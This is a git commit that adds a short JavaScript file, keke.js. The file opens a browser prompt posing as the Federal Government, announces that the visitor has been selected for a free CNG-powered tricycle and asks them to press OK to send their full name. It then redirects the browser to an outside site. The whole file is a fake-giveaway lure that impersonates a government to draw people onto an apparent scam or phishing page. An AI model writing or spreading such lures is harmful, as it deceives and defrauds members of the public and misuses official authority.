39b3b0da97ec33bd33de8f4ef3dcbd01f20d9ba6
boss-bloq <nsisboy01@gmail.com>
2024-10-09 04:00:23 -0700

    Create keke.js

---
+++ keke.js
@@ -0,0 +1,7 @@
+
+
+var password = 'CNG-Powered Tricycles'
+password=prompt('FG: Congratulations, You are among the selected ones to receive the CNG-Powered Tricycle from Federal Government, kindly press Ok to Send us your Full Name now ','CNG-Powered Tricycles');
+if (password != 'CNG-Powered Tricycles') {
+location.href='https://damba-fest.org/cng-powered-tricycles.html';
+}
